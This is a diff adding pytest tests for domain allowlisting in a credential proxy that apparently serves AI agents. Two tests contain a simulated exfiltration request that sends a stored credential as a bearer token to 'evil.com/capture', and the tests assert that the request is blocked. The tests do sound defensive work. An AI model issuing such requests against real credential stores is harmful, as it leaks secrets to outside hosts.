@@ -304,6 +304,117 @@ class TestCredentials:
         )
         assert r.status_code == 403
 
+    # -- URL Binding Tests ------------------------------------------------
+
+    def test_store_with_allowed_domains(self, client, admin_headers):
+        """Storing a credential with allowed_domains should persist them."""
+        r = client.post("/v1/credentials", headers=admin_headers, json={
+            "name": "bound_key",
+            "credential_data": {"value": "secret"},
+            "minimum_trust": "NOVICE",
+            "allowed_domains": ["api.openai.com", "*.github.com"],
+        })
+        assert r.status_code == 201
+        data = r.json()
+        assert data["name"] == "bound_key"
+        assert data["allowed_domains"] == ["api.openai.com", "*.github.com"]
+
+    def test_list_shows_allowed_domains(self, client, admin_headers):
+        """List endpoint should return allowed_domains for each credential."""
+        client.post("/v1/credentials", headers=admin_headers, json={
+            "name": "domain_list_test",
+            "credential_data": {"value": "secret"},
+            "minimum_trust": "NOVICE",
+            "allowed_domains": ["api.example.com"],
+        })
+
+        r = client.get("/v1/credentials", headers=admin_headers)
+        assert r.status_code == 200
+        creds = r.json()
+        cred = next(c for c in creds if c["name"] == "domain_list_test")
+        assert cred["allowed_domains"] == ["api.example.com"]
+
+    def test_store_without_allowed_domains(self, client, admin_headers):
+        """Omitting allowed_domains should default to empty list (unrestricted)."""
+        r = client.post("/v1/credentials", headers=admin_headers, json={
+            "name": "unrestricted_key",
+            "credential_data": {"value": "secret"},
+            "minimum_trust": "NOVICE",
+        })
+        assert r.status_code == 201
+        assert r.json()["allowed_domains"] == []
+
+    def test_proxy_execute_blocked_domain(self, client, admin_headers, registered_agent, agent_headers):
+        """Proxy-execute to a domain not in the allowlist should return 403."""
+        # Store credential restricted to api.openai.com
+        client.post("/v1/credentials", headers=admin_headers, json={
+            "name": "openai_only",
+            "credential_data": {"value": "sk-test-key"},
+            "minimum_trust": "NOVICE",
+            "allowed_domains": ["api.openai.com"],
+        })
+
+        # Agent tries to send credential to evil.com
+        r = client.post(
+            "/v1/credentials/openai_only/proxy-execute",
+            headers=agent_headers,
+            json={
+                "purpose": "exfiltration attempt",
+                "method": "GET",
+                "url": "https://evil.com/capture",
+                "headers": {"Authorization": "Bearer {{CREDENTIAL}}"},
+            },
+        )
+        assert r.status_code == 403
+        assert "Domain not allowed" in r.json()["detail"]
+        assert "evil.com" in r.json()["detail"]
+
+    def test_proxy_execute_allowed_domain(self, client, admin_headers, registered_agent, agent_headers):
+        """Proxy-execute to an allowed domain passes the domain check.
+
+        We verify at the unit level that domain validation passes. The
+        actual HTTP request would fail (no network in test env).
+        """
+        from trust_protocol.core.credential_proxy import CredentialProxy
+        # Direct validation test -- should not raise
+        CredentialProxy.validate_domain("https://httpbin.org/headers", ["httpbin.org"])
+
+    def test_proxy_execute_wildcard_domain_blocked(self, client, admin_headers, registered_agent, agent_headers):
+        """Proxy-execute to a domain not matching the wildcard returns 403."""
+        client.post("/v1/credentials", headers=admin_headers, json={
+            "name": "github_key",
+            "credential_data": {"value": "ghp_test"},
+            "minimum_trust": "NOVICE",
+            "allowed_domains": ["*.github.com"],
+        })
+
+        # evil.com should NOT match *.github.com -- must be 403
+        r = client.post(
+            "/v1/credentials/github_key/proxy-execute",
+            headers=agent_headers,
+            json={
+                "purpose": "exfiltration attempt",
+                "method": "GET",
+                "url": "https://evil.com/capture",
+                "headers": {"Authorization": "Bearer {{CREDENTIAL}}"},
+            },
+        )
+        assert r.status_code == 403
+        assert "Domain not allowed" in r.json()["detail"]
+
+    def test_proxy_execute_wildcard_domain_passes(self, client, admin_headers, registered_agent, agent_headers):
+        """Wildcard domain patterns should match subdomains (unit validation)."""
+        from trust_protocol.core.credential_proxy import CredentialProxy
+        # Unit test that wildcard matching works
+        CredentialProxy.validate_domain("https://api.github.com/user", ["*.github.com"])
+        CredentialProxy.validate_domain("https://uploads.github.com/files", ["*.github.com"])
+
+    def test_proxy_execute_unrestricted_credential(self, client, admin_headers, registered_agent, agent_headers):
+        """Credential with no allowed_domains should pass domain check."""
+        from trust_protocol.core.credential_proxy import CredentialProxy
+        # Unit test: empty allowlist = everything allowed
+        CredentialProxy.validate_domain("https://any-domain.example.com/test", [])
+
 
 # =========================================================================
 # Audit
